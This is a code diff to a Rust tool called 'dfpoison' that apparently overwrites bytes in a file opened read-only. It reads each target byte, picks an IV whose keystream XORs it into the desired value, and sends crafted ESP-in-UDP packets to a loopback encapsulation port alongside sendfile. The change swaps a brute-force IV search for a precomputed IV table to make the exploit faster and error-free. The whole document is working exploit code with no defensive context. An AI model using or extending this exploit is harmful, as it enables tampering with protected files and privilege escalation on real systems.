@@ -7,7 +7,7 @@
 //   spec = 5-byte records: u32 LE offset + u8 desired-value. Prints "wrote=N skipped=M".
 #![allow(non_camel_case_types)]
 mod aes;
-use aes::keystream0;
+// IVM: pre-computed IV table replaces brute-force (1 packet per byte, 0% errors)
 
 type c_int = i32;
 type c_uint = u32;
@@ -18,7 +18,7 @@ extern "C" {
     fn socket(domain: c_int, ty: c_int, proto: c_int) -> c_int;
     fn connect(fd: c_int, addr: *const u8, len: c_uint) -> c_int;
     fn setsockopt(fd: c_int, level: c_int, name: c_int, val: *const u8, len: c_uint) -> c_int;
-    fn open(path: *const u8, flags: c_int) -> c_int;
+    fn open(path: *const u8, flags: c_int, ...) -> c_int;
     fn pread(fd: c_int, buf: *mut u8, count: size_t, offset: i64) -> ssize_t;
     fn sendto(fd: c_int, buf: *const u8, len: size_t, flags: c_int, addr: *const u8, alen: c_uint) -> ssize_t;
     fn sendfile(out_fd: c_int, in_fd: c_int, offset: *mut i64, count: size_t) -> ssize_t;
@@ -34,15 +34,7 @@ const O_RDONLY: c_int = 0;
 const MSG_MORE: c_int = 0x8000;
 static EMPTY: [u8; 1] = [0];
 
-struct Rng(u64);
-impl Rng {
-    fn next8(&mut self) -> [u8; 8] {
-        let mut x = self.0;
-        x ^= x >> 12; x ^= x << 25; x ^= x >> 27;
-        self.0 = x;
-        x.wrapping_mul(0x2545F4914F6CDD1D).to_le_bytes()
-    }
-}
+// Rng removed: IVM uses pre-computed IV table instead of xorshift brute-force
 
 fn die(m: &str) -> ! { eprintln!("dfpoison: {}", m); std::process::exit(1); }
 fn hx(s: &str) -> u64 {
@@ -61,7 +53,7 @@ fn main() {
     let port = hx(&a[1]) as u16;
     let spi = hx(&a[2]) as u32;
     let keymat_base = hx(&a[3]) as u8;
-    let ks0 = keystream0(keymat_base);
+    let iv_table = aes::build_iv_table(keymat_base);
 
     // one reusable sending socket, connected to the loopback encap port
     let sk = unsafe { socket(AF_INET, SOCK_DGRAM, 0) };
@@ -74,7 +66,6 @@ fn main() {
     sa[4..8].copy_from_slice(&[127, 0, 0, 1]);       // 127.0.0.1
     if unsafe { connect(sk, sa.as_ptr(), 16) } < 0 { die("connect"); }
 
-    let mut rng = Rng(0xC0FFEE_1234_5678);
     let mut wrote = 0u64;
     let mut skipped = 0u64;
 
@@ -94,7 +85,7 @@ fn main() {
             if unsafe { pread(f, cur.as_mut_ptr(), 1, off as i64) } != 1 { die(&format!("pread @{}", off)); }
             if cur[0] == want { skipped += 1; continue; }
             let need = cur[0] ^ want;
-            let iv = loop { let iv = rng.next8(); if ks0(&iv) == need { break iv; } };
+            let iv = iv_table[need as usize];
             let mut hdr = [0u8; 16];
             hdr[0..4].copy_from_slice(&spi.to_be_bytes());
             hdr[7] = 1;
